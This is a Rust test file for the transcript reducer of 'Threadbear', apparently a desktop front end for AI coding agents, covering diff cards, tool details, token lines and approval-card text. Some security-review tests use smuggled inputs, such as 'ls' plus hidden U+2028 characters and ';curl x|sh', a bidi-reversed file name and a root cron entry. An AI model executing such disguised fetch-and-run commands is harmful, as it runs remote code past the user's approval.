// Ports of the transcript parts of the rest of
// app/Tests/ThreadbearCoreTests: CodexTranscriptTests.swift, ToolDetailTests.swift,
// CardTextTests.swift, DevToolsTests.swift (RunnerMessageTests and the row
// excerpt), DesignReviewTests.swift, PanelsTests.swift, ScheduleTests.swift
// and SubagentTests.swift.
#![allow(non_snake_case)]

mod support;

use serde_json::{json, Value};
use support::*;
use threadbear_core::reducer::*;

// ---- CodexTranscriptTests ----

fn hunk(lines: &[&str]) -> Value {
    let old = lines.iter().filter(|l| !l.starts_with('+')).count();
    let new = lines.iter().filter(|l| !l.starts_with('-')).count();
    json!({"oldStart": 1, "oldLines": old, "newStart": 1, "newLines": new, "lines": lines})
}

fn diff(seq: i64, item: &str, path: &str, lines: &[&str]) -> Event {
    event(seq, "edit.diff", json!({"itemId": item, "path": path, "hunks": [hunk(lines)]}))
}

fn patch_call(seq: i64) -> Event {
    call_with(seq, "p1", "apply_patch", "edit", "Edit 3 files", json!({"paths": ["/w/site/events.json", "/w/site/events.html", "/w/site/styles.css"]}))
}

#[test]
fn testOneItemWithThreePathsKeepsThreeDiffs() {
    let model = from_events(vec![
        user(1, "Add the meetup"),
        patch_call(2),
        diff(3, "p1", "/w/site/events.json", &["-[]", "+[{\"id\": 1}]"]),
        diff(4, "p1", "/w/site/events.html", &["+<li>Meetup</li>"]),
        diff(5, "p1", "/w/site/styles.css", &["+.poster {}"]),
        // Codex sends a path again as the patch changes: it replaces.
        diff(6, "p1", "/w/site/styles.css", &["+.poster {}", "+.map {}"]),
        result(7, "p1"),
        text(8, "m1", "Done"),
        done(9),
    ]);
    let Some(RowContent::Tool(tool)) = model.item("t:p1").map(|r| &r.content) else { panic!("no tool row") };
    assert_eq!(tool.diffs.iter().map(|d| d.path.clone()).collect::<Vec<_>>(), ["/w/site/events.json", "/w/site/events.html", "/w/site/styles.css"]);
    assert_eq!(tool.diffs.last().and_then(|d| d.hunks.first()).map(|h| h.lines.clone()), Some(vec!["+.poster {}".to_owned(), "+.map {}".to_owned()]), "the repeated path replaced its diff");
    assert_eq!(model.item("t:p1").map(|r| r.kind()), Some(RowKind::Diff));
    // The Edited files card lists and counts all three.
    let Some(RowContent::Changes(card)) = model.row("cf:t1").map(|r| &r.content) else { panic!("no card") };
    assert_eq!(card.title(), "Edited 3 files");
    assert_eq!(card.files.iter().map(|f| f.name()).collect::<Vec<_>>(), ["events.json", "events.html", "styles.css"]);
    assert_eq!(card.files.last().map(|f| f.added), Some(2));
    assert_eq!(card.added(), 4);
    assert_eq!(card.removed(), 1);
}

#[test]
fn testTheWorkLineCountsEachFileOfAPatch() {
    let model = from_events(vec![
        user(1, "Go"),
        event(2, "reasoning", json!({"itemId": "r1", "text": "Editing the three files."})),
        patch_call(3),
        diff(4, "p1", "/w/site/events.json", &["+a"]),
        diff(5, "p1", "/w/site/events.html", &["+b"]),
        diff(6, "p1", "/w/site/styles.css", &["+c"]),
        result(7, "p1"),
        text(8, "m1", "Done"),
    ]);
    let Some(RowContent::Group(group)) = model.rows().iter().find(|r| r.kind() == RowKind::Group).map(|r| &r.content) else { panic!("no group") };
    assert_eq!(group.summary, "Edited 3 files");
    // Before any diff arrives, the call's `paths` still count.
    let early = from_events(vec![user(1, "Go"), patch_call(2)]);
    let diffs: Vec<&Row> = early.rows().iter().filter(|r| r.kind() == RowKind::Diff).collect();
    assert_eq!(WorkSummary::describe(&diffs).0, "Edited 3 files");
}

#[test]
fn testAClaudeEditStillBuildsItsDiffFromTheInput() {
    let model = from_events(vec![
        user(1, "Go"),
        call_with(2, "c1", "Edit", "edit", "Edit a.swift", json!({"file_path": "/a.swift", "old_string": "let a = 1", "new_string": "let a = 2"})),
        result(3, "c1"),
        done(4),
    ]);
    let Some(RowContent::Tool(tool)) = model.item("t:c1").map(|r| &r.content) else { panic!("a tool") };
    assert!(tool.diffs.is_empty());
    assert_eq!(tool.effective_diffs().first().and_then(|d| d.hunks.first()).map(|h| h.lines.clone()), Some(vec!["-let a = 1".to_owned(), "+let a = 2".to_owned()]));
}

/// A command Codex left running when its turn ended reports after the turn,
/// with no turn id: it fills its row, which stops looking busy, and the
/// turn's footer and work line stay where they were.
#[test]
fn testALateResultWithNoTurnFillsItsRow() {
    let mut model = from_events(vec![
        user(1, "Build it"),
        call_with(2, "b1", "shell", "command", "npm run build", json!({"command": "npm run build"})),
        text(3, "m1", "It's building."),
        done(4),
    ]);
    let before = ids(&model);
    let footer = model.index_of("f:t1");
    model.apply(vec![event_no_turn(5, "tool.result", json!({"itemId": "b1", "ok": true, "text": "built in 8s", "truncated": false, "images": []}))]);
    let Some(RowContent::Tool(tool)) = model.item("t:b1").map(|r| &r.content) else { panic!("no row") };
    assert!(tool.is_finished());
    assert_eq!(tool.result.as_ref().map(|r| r.text.as_str()), Some("built in 8s"));
    assert_eq!(model.item("t:b1").and_then(|r| r.turn_id.as_deref()), Some("t1"), "still in its turn");
    assert_eq!(ids(&model), before, "no row moved or appeared");
    assert_eq!(model.index_of("f:t1"), footer);
    assert!(model.rows().iter().all(|r| r.kind() != RowKind::Working), "nothing looks busy");
}

#[test]
fn testWorkSummaryImageWords() {
    let image = json!({"path": "/m/poster.png", "mediaType": "image/png", "width": 512, "height": 512});
    let model = from_events(vec![
        user(1, "Make a poster"),
        call_with(2, "ig1", "image_generation", "image", "Generate image", json!({})),
        result_with(3, "ig1", true, "A poster", json!([image])),
        call_with(4, "v1", "view_image", "read", "View docs/map.png", json!({"path": "/w/docs/map.png"})),
        result_images(5, "v1", json!([image])),
        call_with(6, "ig2", "image_generation", "image", "Generate image", json!({})),
        result_with(7, "ig2", true, "Another", json!([image])),
        text(8, "m1", "Here they are"),
        done(9),
    ]);
    let summaries: Vec<String> = ["t:ig1", "t:v1", "t:ig2"].iter().filter_map(|id| model.item(id)).map(|row| WorkSummary::describe(&[row]).0).collect();
    assert_eq!(summaries, ["Made an image", "Viewed an image", "Made an image"]);
    // The pictures it made are the answer, so they stay out of the finished
    // turn's line of work; one it only looked at folds away.
    let Some(RowContent::Images { generated, .. }) = model.row("i:ig1").map(|r| &r.content) else { panic!("no image row") };
    assert!(generated, "a generated image is shown larger");
    assert!(model.row("i:ig2").is_some());
    assert!(model.row("i:v1").is_none());
    let Some(RowContent::Images { generated: viewed, .. }) = model.item("i:v1").map(|r| &r.content) else { panic!("no image row") };
    assert!(!viewed);
    let row = Row::new(
        "t:a",
        1,
        None,
        RowContent::Tool(ToolItem {
            item_id: "a".into(),
            call: Some(ToolCall::new("a", "image_generation", ToolKind::Image, "Generate image", json!({}))),
            result: Some(ToolResult { images: vec![ImageRef::new("/1.png", "image/png"), ImageRef::new("/2.png", "image/png")], ..ToolResult::new("a", true, "") }),
            ..ToolItem::default()
        }),
    );
    assert_eq!(WorkSummary::describe(&[&row]).0, "Made 2 images");
    assert_eq!(ToolPresentation::symbol(ToolKind::Image, "image_generation"), "photo");
}

#[test]
fn testTheErrorRowLearnsWhyTheTurnFailed() {
    let model = from_events(vec![
        user(1, "Go"),
        event(2, "error", json!({"message": "The conversation is too long"})),
        event(3, "turn.completed", json!({"turnId": "t1", "outcome": "failed", "durationMs": 900, "error": "The conversation is too long", "errorKind": "contextWindow"})),
    ]);
    let Some(RowContent::Error { message, kind }) = model.row("e:2").map(|r| &r.content) else { panic!("no error row") };
    assert_eq!(message, "The conversation is too long");
    assert_eq!(*kind, Some(TurnErrorKind::ContextWindow));
}

#[test]
fn testTokenLineForDebugInfo() {
    let codex = json!({"inputTokens": 24177, "cachedInputTokens": 12032, "outputTokens": 310, "reasoningTokens": 120});
    assert_eq!(token_line(Some(&codex)).as_deref(), Some("24,177 in (12,032 cached), 310 out, 120 reasoning"));
    let claude = json!({"inputTokens": 12, "outputTokens": 900, "cacheReadTokens": 40000, "cacheWriteTokens": 2100});
    assert_eq!(token_line(Some(&claude)).as_deref(), Some("12 in (40,000 cached), 2,100 cache written, 900 out"));
    assert_eq!(token_line(None), None);
    // The footer's own words in a dump and "Copy debug info".
    let footer = Row::new("f:t1", 9, None, RowContent::Footer(TurnCompletion { turn_id: "t1".into(), duration_ms: 12_000.0, usage: Some(codex), ..TurnCompletion::default() }));
    assert_eq!(RowDebug::text(&footer), "12s, 24,177 in (12,032 cached), 310 out, 120 reasoning");
}

#[test]
fn testAViewedImageReadsAsViewNotRead() {
    let tool = ToolItem { item_id: "v1".into(), call: Some(ToolCall::new("v1", "view_image", ToolKind::Read, "View orange.png", json!({"path": "/w/orange.png"}))), root: Some("/w".into()), ..ToolItem::default() };
    assert_eq!(ToolPresentation::file_title(&tool).map(|t| t.verb), Some("View".to_owned()));
    assert_eq!(ToolPresentation::file_title(&tool).map(|t| t.name), Some("orange.png".to_owned()));
    assert_eq!(ToolPresentation::symbol(ToolKind::Read, "view_image"), "photo");
    assert_eq!(ToolPresentation::symbol(ToolKind::Read, "Read"), "doc.text");
}

// ---- ToolDetailTests ----

fn tool(name: &str, kind: ToolKind, title: &str, input: Value, output: Option<&str>, ok: bool) -> ToolItem {
    ToolItem {
        item_id: "c1".into(),
        call: Some(ToolCall::new("c1", name, kind, title, input)),
        result: output.map(|text| ToolResult::new("c1", ok, text)),
        ..ToolItem::default()
    }
}

fn input_tool(name: &str, kind: ToolKind, input: Value) -> ToolItem {
    tool(name, kind, "t", input, None, true)
}

#[test]
fn testFileToolsTitleTheFileThenItsFolder() {
    let home = text::home_directory();
    let read = ToolPresentation::file_title(&input_tool("Read", ToolKind::Read, json!({"file_path": format!("{home}/dev/photo-sync/Sources/Upload/UploadTask.swift")})));
    assert_eq!(read, Some(FileTitle { verb: "Read".into(), name: "UploadTask.swift".into(), folder: "Sources/Upload".into(), path: "~/dev/photo-sync/Sources/Upload/UploadTask.swift".into() }));
    assert_eq!(ToolPresentation::file_title(&input_tool("Write", ToolKind::Write, json!({"file_path": "/tmp/a.txt"}))).map(|t| t.verb), Some("Write".to_owned()));
    let edit = ToolPresentation::file_title(&input_tool("MultiEdit", ToolKind::Edit, json!({"file_path": format!("{home}/notes.md")})));
    assert_eq!(edit.as_ref().map(|t| t.verb.as_str()), Some("Edit"));
    assert_eq!(edit.as_ref().map(|t| t.folder.as_str()), Some("~"));
    assert_eq!(ToolPresentation::file_title(&input_tool("Write", ToolKind::Write, json!({"file_path": "/a.txt"}))).map(|t| t.folder), Some(String::new()));
    // Not a file tool, or no path: the plain title is used.
    assert_eq!(ToolPresentation::file_title(&input_tool("Bash", ToolKind::Command, json!({"command": "ls"}))), None);
    assert_eq!(ToolPresentation::file_title(&input_tool("Read", ToolKind::Read, json!({}))), None);
}

#[test]
fn testFolderNames() {
    let home = text::home_directory();
    assert_eq!(PathDisplay::folder("/Users/mike/dev/photo-sync/Sources/Upload/UploadTask.swift"), "Sources/Upload");
    assert_eq!(PathDisplay::folder(&format!("{home}/a.txt")), "~");
    assert_eq!(PathDisplay::folder("~/a.txt"), "~");
    assert_eq!(PathDisplay::folder("/a.txt"), "");
    assert_eq!(PathDisplay::folder("/tmp/a.txt"), "tmp");
    assert_eq!(PathDisplay::folder("a.txt"), "");
}

#[test]
fn testACommandShowsTheCommandThenItsOutput() {
    let detail = ToolPresentation::detail(&tool("Bash", ToolKind::Command, "t", json!({"command": "npm test"}), Some("12 passed\n"), true), 400);
    assert_eq!(detail, Detail::Command { command: "npm test".into(), output: "12 passed".into() });
}

#[test]
fn testAReadKeepsClaudesLineNumbers() {
    let read = tool("Read", ToolKind::Read, "t", json!({"file_path": "/a.swift"}), Some("     9→import Foundation\n    10→\n    11→let x = 1"), true);
    let Detail::File { path, lines } = ToolPresentation::detail(&read, 400) else { panic!("a file") };
    assert_eq!(path, "/a.swift");
    assert_eq!(lines.iter().map(|l| l.number).collect::<Vec<_>>(), [Some(9), Some(10), Some(11)]);
    assert_eq!(lines.iter().map(|l| l.text.clone()).collect::<Vec<_>>(), ["import Foundation", "", "let x = 1"]);
}

#[test]
fn testAReadWithoutNumbersIsNumberedFromItsOffset() {
    let read = tool("Read", ToolKind::Read, "t", json!({"file_path": "/a.swift", "offset": 40}), Some("a\nb"), true);
    let Detail::File { lines, .. } = ToolPresentation::detail(&read, 400) else { panic!("a file") };
    assert_eq!(lines, [NumberedLine { number: Some(40), text: "a".into() }, NumberedLine { number: Some(41), text: "b".into() }]);
}

#[test]
fn testAFailedReadShowsItsInputAndError() {
    let read = tool("Read", ToolKind::Read, "t", json!({"file_path": "/missing"}), Some("File does not exist."), false);
    assert_eq!(ToolPresentation::detail(&read, 400), Detail::Fields { fields: vec![Field::new("file_path", "/missing")], output: "File does not exist.".into() });
}

#[test]
fn testASearchShowsTheQueryAndWhere() {
    let search = tool("Grep", ToolKind::Search, "t", json!({"pattern": "class Upload", "path": "Sources"}), Some("a.swift:1:class Upload"), true);
    assert_eq!(ToolPresentation::detail(&search, 400), Detail::Search { query: "class Upload".into(), scope: Some("Sources".into()), output: "a.swift:1:class Upload".into() });
}

#[test]
fn testOtherToolsShowTheirInputAsFieldsNotJSON() {
    let other = tool("mcp__notion__search", ToolKind::Mcp, "t", json!({"query": "roadmap", "limit": 5, "filter": {"type": "page"}, "cursor": null}), Some("3 pages"), true);
    assert_eq!(
        ToolPresentation::detail(&other, 400),
        Detail::Fields { fields: vec![Field::new("filter", "{\"type\":\"page\"}"), Field::new("limit", "5"), Field::new("query", "roadmap")], output: "3 pages".into() }
    );
}

#[test]
fn testLongFieldValuesAreCut() {
    let long = (1..=10).map(|n| format!("line {n}")).collect::<Vec<_>>().join("\n");
    let fields = ToolPresentation::fields(&json!({"text": long}), false);
    assert_eq!(fields.first().map(|f| f.value.split('\n').count()), Some(7), "six lines and an ellipsis");
}

#[test]
fn testLiveTitles() {
    let bash = |title: &str| tool("Bash", ToolKind::Command, title, json!({"command": "npm test"}), None, true);
    assert_eq!(ToolPresentation::active_title(&bash("npm test")), "Running npm test");
    assert_eq!(ToolPresentation::active_title(&bash("Run the tests")), "Run the tests");
    assert_eq!(ToolPresentation::active_title(&tool("Read", ToolKind::Read, "Read a.swift", json!({}), None, true)), "Read a.swift");
}

// ---- CardTextTests ----

fn approval_request(name: &str, input: Value) -> ApprovalRequest {
    ApprovalRequest::new("ap1", name, "t", input)
}

#[test]
fn testApprovalTitlesAndTargets() {
    let write = approval_request("Write", json!({"file_path": "/Users/mike/dev/photo-sync/scripts/release.sh", "content": "x"}));
    assert_eq!(ApprovalText::title(&write), "Write release.sh?");
    assert_eq!(ApprovalText::target(&write), "Write release.sh");
    let bash = approval_request("Bash", json!({"command": "rm -rf .build DerivedData\necho done"}));
    assert_eq!(ApprovalText::title(&bash), "Run this command?");
    assert_eq!(ApprovalText::target(&bash), "rm -rf .build DerivedData", "a command is named by its first line");
    let mcp = approval_request("mcp__github__get_pull_request", json!({"pullNumber": 48}));
    assert_eq!(ApprovalText::title(&mcp), "Use get pull request?");
    assert_eq!(ApprovalText::target(&approval_request("WebFetch", json!({"url": "https://example.com"}))), "Fetch https://example.com");
    assert_eq!(ApprovalText::target(&approval_request("Edit", json!({}))), "Edit this file");
    assert_eq!(ApprovalText::decision(ApprovalDecision::AllowAlways), "Always allowed");
}

/// Finding 67: Threadbear's own gates say what they'd do in the runner's
/// words, and the card shows them under its generic title; another
/// server's tool doesn't get to put words there.
#[test]
fn threadbear_cards_say_what_the_runner_is_asking() {
    let raise = ApprovalRequest::new("ap1", "mcp__threadbear__update_thread", "Switch this thread to Full access", json!({"threadId": "t1", "permissionMode": "full"}));
    assert_eq!(ApprovalText::title(&raise), "Use update thread?");
    assert_eq!(ApprovalText::runner_reason(&raise).as_deref(), Some("Switch this thread to Full access"));
    let fields = threadbear_core::reducer::ToolPresentation::fields(&raise.input, true);
    assert!(fields.iter().any(|f| f.key == "permissionMode" && f.value == "full"), "the card's fields still show the mode");
    let other = ApprovalRequest::new("ap2", "mcp__github__merge", "Switch this thread to Full access", json!({}));
    assert_eq!(ApprovalText::runner_reason(&other), None);
    let hidden = ApprovalRequest::new("ap3", "mcp__threadbear__send_message", "Send\u{2028}it", json!({}));
    assert_eq!(ApprovalText::runner_reason(&hidden).as_deref(), Some("Send\u{27E8}U+2028\u{27E9}it"));
}

/// Codex review of the 10 Nov fix: a tab drew as four spaces and spaces
/// at a line's end as nothing, so swapping them drew the same card.
#[test]
fn approval_text_shows_tabs_and_trailing_spaces() {
    assert_eq!(ApprovalText::shown_exactly("    END"), "    END");
    assert_eq!(ApprovalText::shown_exactly("\tEND"), "\u{21E5}   END");
    assert_eq!(ApprovalText::shown_exactly("+END  \n+next"), "+END\u{B7}\u{B7}\n+next");
    assert_ne!(ApprovalText::shown_exactly("    END"), ApprovalText::shown_exactly("\tEND"));
    assert_eq!(ApprovalText::shown_exactly("a\u{2028}b"), "a\u{27E8}U+2028\u{27E9}b");
    let ends = |c: &str| ApprovalText::fields_beyond_diff(&json!({"file_path": "/etc/cron.d/x", "content": c})).len();
    assert_eq!(ends("* * * * * root true\n"), 0);
    assert_eq!(ends("* * * * * root true"), 1);
}

/// Codex review of the 10 Nov fix: what a file card's diff doesn't draw is
/// still part of what Allow allows, so it's listed under the diff.
#[test]
fn file_cards_list_what_the_diff_doesnt_draw() {
    let keys = |input: Value| ApprovalText::fields_beyond_diff(&input).into_iter().map(|f| format!("{}={}", f.key, f.value)).collect::<Vec<_>>();
    assert_eq!(keys(json!({"file_path": "/w/a", "old_string": "a", "new_string": "b", "replace_all": true})), ["replace_all=true"]);
    assert_eq!(keys(json!({"file_path": "/w/a", "content": "x\n"})), Vec::<String>::new());
    assert_eq!(keys(json!({"file_path": "/w/a", "edits": [{"old_string": "a", "new_string": "b"}, {"old_string": "c", "new_string": "d", "replace_all": true}]})), ["edit 2={\"replace_all\":true}"]);
    assert_eq!(keys(json!({"notebook_path": "/w/n.ipynb", "cell_id": "c1", "new_source": "x"})), ["cell_id=c1", "new_source=x"]);
    // A line break the diff can't draw: the commented-out `rm` after it
    // would start a line of its own.
    let adds = keys(json!({"file_path": "/w/build.sh", "old_string": "# original comment\n# Disabled: ", "new_string": "# updated comment\n# Disabled: \n"}));
    assert_eq!(adds.len(), 1);
    assert!(adds[0].starts_with("line break=the new text adds a line break"), "{adds:?}");
    assert!(keys(json!({"file_path": "/w/build.sh", "old_string": "# original comment\n# Disabled: ", "new_string": "# updated comment\n# Disabled: "})).is_empty());
    let drops = keys(json!({"file_path": "/w/a", "edits": [{"old_string": "a\n", "new_string": "b"}]}));
    assert!(drops[0].starts_with("edit 1 line break=the new text drops"), "{drops:?}");
}

/// A character that hides, breaks or reorders text is named on the card,
/// not drawn: `ls`, six U+2028 and `;curl` must not look like `ls` alone,
/// and a bidi override must not turn the line around (security review, 9
/// Nov 2026).
#[test]
fn testApprovalCardsNameCharactersThatHideOrReorderText() {
    let command = format!("ls{};curl x|sh", "\u{2028}".repeat(2));
    assert_eq!(ApprovalText::shown(&command), "ls\u{27E8}U+2028\u{27E9}\u{27E8}U+2028\u{27E9};curl x|sh");
    for scalar in [0x2029u32, 0x0085, 0x000D, 0x000B, 0x000C, 0x001B, 0x007F, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x2066, 0x2067, 0x2068, 0x2069, 0x200E, 0x200F, 0x061C, 0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x00AD] {
        let ch = char::from_u32(scalar).unwrap();
        let shown = ApprovalText::shown(&format!("a{ch}b"));
        assert_eq!(shown, format!("a\u{27E8}U+{scalar:04X}\u{27E9}b"), "U+{scalar:04X}");
    }
    // A line break and a tab read as they look, and so does everything else.
    assert_eq!(ApprovalText::shown("npm test\n\techo done"), "npm test\n\techo done");
    assert_eq!(ApprovalText::shown("git commit -m \"caf\u{E9} \u{65E5}\u{672C} \u{1F43B}\" e\u{0301}"), "git commit -m \"caf\u{E9} \u{65E5}\u{672C} \u{1F43B}\" e\u{0301}");
    let fields = ApprovalText::shown_fields(&[Field::new("prompt", "hi\u{202E}there")]);
    assert_eq!(fields.first().map(|f| f.value.as_str()), Some("hi\u{27E8}U+202E\u{27E9}there"));
    // The line an answered card becomes, and a file's name in the title,
    // name them too: an allowed `ls` + U+2028 + more isn't "Allowed ls".
    let allowed = approval_request("Bash", json!({"command": "ls\u{2028};curl x|sh"}));
    assert_eq!(ApprovalText::target(&allowed), "ls\u{27E8}U+2028\u{27E9};curl x|sh");
    // Characters that draw as nothing, other spaces and right-to-left letters.
    for scalar in [0x034Fu32, 0xFE0F, 0x180B, 0x3164, 0x115F, 0x1160, 0xFFA0, 0x2800, 0x00A0, 0x3000, 0x05D0, 0x0627, 0xFB1D] {
        let ch = char::from_u32(scalar).unwrap();
        assert_eq!(ApprovalText::shown(&format!("a{ch}b")), format!("a\u{27E8}U+{scalar:04X}\u{27E9}b"), "U+{scalar:04X}");
    }
    assert_eq!(ApprovalText::shown("./deploy\u{034F}.sh"), "./deploy\u{27E8}U+034F\u{27E9}.sh");
    let write = approval_request("Write", json!({"file_path": "/w/notes\u{202E}txt.sh", "content": "x"}));
    assert_eq!(ApprovalText::title(&write), "Write notes\u{27E8}U+202E\u{27E9}txt.sh?");
}

#[test]
fn testAnswersReadInTheOrderTheQuestionsWereAsked() {
    let request = QuestionRequest {
        approval_id: "q1".into(),
        item_id: None,
        questions: vec![
            Question { question: "Which colour?".into(), header: None, multi_select: false, options: vec![QuestionOption { label: "Blue".into(), description: None }] },
            Question { question: "Which size?".into(), header: None, multi_select: false, options: vec![QuestionOption { label: "Small".into(), description: None }] },
        ],
    };
    let answers = |pairs: &[(&str, &str)]| pairs.iter().map(|(k, v)| ((*k).to_owned(), (*v).to_owned())).collect();
    assert_eq!(ApprovalText::answer_summary(&request, &answers(&[("Which size?", "Small"), ("Which colour?", "Blue")])), "Blue; Small");
    assert_eq!(ApprovalText::answer_summary(&request, &answers(&[("Which colour?", "Green, Blue")])), "Green, Blue");
    assert_eq!(ApprovalText::answer_summary(&request, &answers(&[])), "");
}

#[test]
fn testPlanTitles() {
    let entries = |statuses: &[PlanStatus]| statuses.iter().map(|s| PlanEntry::new("x", *s)).collect::<Vec<_>>();
    assert_eq!(PlanSummary::title(&entries(&[PlanStatus::Completed, PlanStatus::Completed, PlanStatus::InProgress, PlanStatus::Pending, PlanStatus::Pending])), "2 of 5 steps done");
    assert_eq!(PlanSummary::title(&entries(&[PlanStatus::Completed, PlanStatus::Completed, PlanStatus::Completed])), "All 3 steps done");
    assert_eq!(PlanSummary::title(&entries(&[PlanStatus::Completed])), "1 step done");
    assert_eq!(PlanSummary::title(&entries(&[PlanStatus::Pending])), "0 of 1 step done");
    assert_eq!(PlanSummary::title(&[]), "No steps yet");
}

#[test]
fn testFoldersAreRelativeToTheThreadsFolder() {
    let root = "/Users/mike/dev/photo-sync";
    assert_eq!(PathDisplay::folder_relative(&format!("{root}/scripts/release.sh"), Some(root)), "scripts");
    assert_eq!(PathDisplay::folder_relative(&format!("{root}/Sources/Upload/UploadTask.swift"), Some(&format!("{root}/"))), "Sources/Upload");
    assert_eq!(PathDisplay::folder_relative(&format!("{root}/Package.swift"), Some(root)), "", "a file at the top has no folder");
    // Outside the thread's folder, or no folder: as before.
    assert_eq!(PathDisplay::folder_relative("/Users/mike/dev/other/Sources/a.swift", Some(root)), "other/Sources");
    assert_eq!(PathDisplay::folder_relative(&format!("{root}-old/a.swift"), Some(root)), "dev/photo-sync-old", "a sibling with the same prefix is outside");
    assert_eq!(PathDisplay::folder_relative(&format!("{root}/scripts/release.sh"), None), "photo-sync/scripts");
    assert_eq!(PathDisplay::folder_relative(&format!("{}/dev/x/a.txt", text::home_directory()), Some("~/dev")), "x");
    assert_eq!(PathDisplay::relative_path("/a.txt", "/"), None);
}

#[test]
fn testFileRowsAndTheChangesCardUseTheThreadsFolder() {
    let root = "/Users/mike/dev/photo-sync";
    let path = format!("{root}/scripts/release.sh");
    let model = TranscriptModel::from_events(
        vec![user(1, "Go"), call_with(2, "w", "Write", "write", "Write", json!({"file_path": path, "content": "echo hi\n"})), result(3, "w"), done(4)],
        Some(root.to_owned()),
    );
    let Some(RowContent::Tool(tool)) = model.item("t:w").map(|r| &r.content) else { panic!("a tool") };
    assert_eq!(ToolPresentation::file_title(tool).map(|t| t.folder), Some("scripts".to_owned()));
    let Some(RowContent::Changes(card)) = model.row("cf:t1").map(|r| &r.content) else { panic!("a card") };
    assert_eq!(card.files.first().map(|f| f.folder()), Some("scripts".to_owned()));
}

#[test]
fn testFieldKeysLineUpUpToACap() {
    let fields = vec![Field::new("owner", "mike"), Field::new("pullNumber", "48"), Field::new("repo", "photo-sync")];
    assert_eq!(ToolPresentation::key_width(&fields, 16), 11, "\"pullNumber:\" is the widest");
    let mut long = fields;
    long.push(Field::new("a_really_long_parameter_name", "x"));
    assert_eq!(ToolPresentation::key_width(&long, 16), 16, "a long key doesn't push every value right");
    assert_eq!(ToolPresentation::key_width(&long, 20), 20);
    assert_eq!(ToolPresentation::key_width(&[], 16), 0);
}

#[test]
fn testErrorLines() {
    assert!(ToolPresentation::is_error_line("error: SIGNING_IDENTITY is not set"));
    assert!(ToolPresentation::is_error_line("Error: Cannot find module"));
    assert!(ToolPresentation::is_error_line("  fatal: not a git repository"));
    assert!(ToolPresentation::is_error_line("ERROR [build 3/7] failed"));
    assert!(!ToolPresentation::is_error_line("Building for production..."));
    assert!(!ToolPresentation::is_error_line("errors.swift compiled"));
    assert!(!ToolPresentation::is_error_line("0 errors"));
    assert!(!ToolPresentation::is_error_line("error"));
}

// ---- DevToolsTests (RunnerMessageTests and the excerpt) ----

fn row_debug_events() -> Vec<Event> {
    vec![
        user(1, "Fix it"),
        event(2, "turn.started", json!({"turnId": "t1"})),
        event(3, "plan.updated", json!({"entries": [{"text": "Look", "status": "in_progress"}]})),
        event(4, "reasoning", json!({"itemId": "r1", "text": "Looking"})),
        call_with(5, "c1", "Edit", "edit", "Edit a.swift", json!({"file_path": "/p/a.swift", "old_string": "a", "new_string": "b"})),
        event(6, "approval.requested", json!({"approvalId": "ap1", "itemId": "c1", "name": "Edit", "title": "Edit a.swift", "input": {}, "options": ["allow", "deny"]})),
        event(7, "approval.resolved", json!({"approvalId": "ap1", "decision": "allow"})),
        result_text(8, "c1", "ok"),
        event(9, "edit.diff", json!({"itemId": "c1", "path": "/p/a.swift", "hunks": [{"oldStart": 1, "oldLines": 1, "newStart": 1, "newLines": 1, "lines": ["-a", "+b"]}]})),
        event(10, "plan.updated", json!({"entries": [{"text": "Look", "status": "completed"}]})),
        text(11, "m1", "Fixed."),
        done(12),
        event_no_turn(13, "system.note", json!({"text": "Runner restarted: a to b"})),
        event_turn(14, "user.message", json!({"text": "Check it.", "images": [], "origin": "runner"}), Some("t2")),
        event_turn(15, "turn.started", json!({"turnId": "t2"}), Some("t2")),
        result_with(16, "c2", true, "shot", json!([{"path": "/tmp/a.png", "mediaType": "image/png"}])),
    ]
}

#[test]
fn testOriginIsReadAndCarriedToTheRow() {
    let e = event(1, "user.message", json!({"text": "Check your change.", "images": [], "origin": "runner"}));
    assert_eq!(e.payload, EventPayload::UserMessage { text: "Check your change.".into(), images: vec![], origin: Some("runner".into()), answers: vec![], edit_of: None, review: None });
    let model = from_events(vec![e, user(2, "Thanks")]);
    let (RowContent::User(runner), RowContent::User(mike)) = (&model.items()[0].content, &model.items()[1].content) else { panic!("users") };
    assert!(runner.is_from_runner());
    assert!(!mike.is_from_runner());
    // Still a user row: it starts the turn the runner asked for.
    assert_eq!(model.items()[0].kind(), RowKind::User);
}

#[test]
fn testAnUnknownOriginIsNotTheRunner() {
    let e = event(1, "user.message", json!({"text": "hi", "images": [], "origin": "somethingNew"}));
    let model = from_events(vec![e]);
    let RowContent::User(message) = &model.items()[0].content else { panic!("a user") };
    assert!(!message.is_from_runner());
}

#[test]
fn testExcerptIsOneShortLine() {
    let mut events = row_debug_events();
    events.push(text(17, "m2", &format!("First line\n\n  second   line {}", "x".repeat(200))));
    let model = from_events(events);
    let long = RowDebug::excerpt(model.item("a:m2").unwrap(), 30);
    assert_eq!(long, "First line second line xxxxxx…");
    assert_eq!(long.chars().count(), 30);
    assert_eq!(RowDebug::excerpt(model.item("ap:ap1").unwrap(), 100), "Edit a.swift (allow)");
    assert_eq!(RowDebug::excerpt(model.item("i:c2").unwrap(), 100), "1 image");
    assert_eq!(RowDebug::excerpt(model.item("f:t1").unwrap(), 100), "4s, $0.12");
    assert_eq!(RowDebug::excerpt(model.row("w:t2").unwrap(), 100), "Working");
    assert_eq!(RowDebug::excerpt(model.item("u:14").unwrap(), 100), "(sent by the runner) Check it.");
}

/// The same rows from the same events the "Copy debug info" tests in
/// DevToolsTests read: a finished turn's work with its plan, and the
/// runner's note after it (RowDebugTests.testGroupAndChangesCard...).
#[test]
fn testTheDevToolsThreadFoldsAsTheSwiftDoes() {
    let model = from_events(row_debug_events());
    let group = model.rows().iter().find(|r| r.kind() == RowKind::Group).expect("a group");
    let RowContent::Group(members) = &group.content else { panic!("a group") };
    // A finished turn's one line of work: its plan too, and the runner's
    // note after it.
    assert_eq!(members.member_ids, ["p:3", "r:r1", "t:c1", "ap:ap1", "n:13"]);
}

// ---- DesignReviewTests, PanelsTests, ScheduleTests, SubagentTests ----

fn review_sample() -> Value {
    json!({
        "id": "review-1", "title": "Account picker", "status": "pending", "revision": 1,
        "createdAt": "2026-10-27T10:00:00Z", "updatedAt": "2026-10-27T10:00:00Z",
        "options": [
            {"id": "A", "title": "Auto account", "image": {"path": "/tmp/a.png", "mediaType": "image/png", "width": 2200, "height": 1520}},
            {"id": "B", "title": "One picker", "image": {"path": "/tmp/b.png", "mediaType": "image/png"}},
            {"id": "D", "title": "Moving mid-thread", "reference": true, "image": {"path": "/tmp/d.png", "mediaType": "image/png"}},
        ],
        "draft": {"notes": {}},
    })
}

